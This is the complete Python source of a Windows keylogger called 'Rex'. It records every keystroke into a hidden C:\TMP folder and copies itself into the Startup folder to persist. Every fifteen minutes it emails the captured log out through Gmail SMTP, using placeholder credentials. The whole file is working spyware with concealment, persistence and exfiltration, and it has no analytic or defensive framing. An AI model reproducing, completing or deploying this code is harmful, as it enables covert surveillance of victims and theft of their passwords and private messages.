import time, smtplib, ctypes, os, shutil, threading
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pynput import keyboard

class Rex:   
    #Add the executable to startup
    def AddStarUp(self): 
        User = os.getenv("USERNAME")
        FileName = os.path.splitext(os.path.basename(__file__))[0] + ".exe"
        Destination = f'C:\\Users\\{User}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        shutil.copy(FileName, Destination)

    #Creates a new invisible dir where the file will stay
    def Dir(self, Path):
        if os.path.isdir(Path) != True:
            os.mkdir(Path)
            ctypes.windll.kernel32.SetFileAttributesW(Path, 0x02)   
    
    #Write the collected keys in the file
    def WriteFile(self, Key):
        with open('C:\\TMP\\TmpFile.txt', "a") as f:
            time_now = time.ctime()
            f.write(str(time_now) + " - Key -> " + str(Key) + "\n")
     
    #Collect the pressed key and write the key in a file
    def GetKey(self, PressedKey):
        try:
            Key = str(PressedKey.char)
        except AttributeError:
            if PressedKey == PressedKey.space:
                Key = "Space"
            elif PressedKey == PressedKey.esc:
                Key = "ESC"
            else:
                Key = str(PressedKey)
        self.WriteFile(Key)

    #Collect the pressed keys with a listener and calls SendEMail
    def CatchKey(self):
        with keyboard.Listener(on_press=self.GetKey) as KeybordListener:
            self.SendEMail()
            KeybordListener.join()
        
    #Create a new thread that with the chosen time will call MakeEmail and erase the information in txt file to send the new keys
    def SendEMail(self):
        Time = 900 #Time is in seconds 
        self.MakeEMail('*******@gmail.com', '**********', '*******@gmail.com', 'C:\\TMP\\TmpFile.txt')
        with open('C:\\TMP\\TmpFile.txt', "r+") as f:
            f.truncate(0)
        timer = threading.Timer(Time, self.SendEMail) 
        timer.start()
    
    #Make the email with the collected information
    def MakeEMail(self, EmailSender, Password, EmailReceiver, UpLoadFilePath):
        msg = MIMEMultipart()
        msg['From'] = EmailSender
        msg['To'] = EmailReceiver
        msg['Subject'] = 'Txt Importante'
        msg.attach(MIMEText('Info', 'plain'))

        # Setup the email
        filename = os.path.basename(UpLoadFilePath)
        attachment = open(UpLoadFilePath, "rb")
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

        # Attatch the file to send on email
        msg.attach(part)

        # Sends the email
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.ehlo()
        server.starttls()
        server.login(EmailSender, Password)
        text = msg.as_string()
        server.sendmail(EmailSender, EmailReceiver, text)
        server.quit()

    def Run(self):
        self.Dir('C:\\TMP')
        self.AddStarUp() #If you want to make tests with the code comment this line -> #self.AddStartUp
        while True:
            self.CatchKey()

Rex().Run()
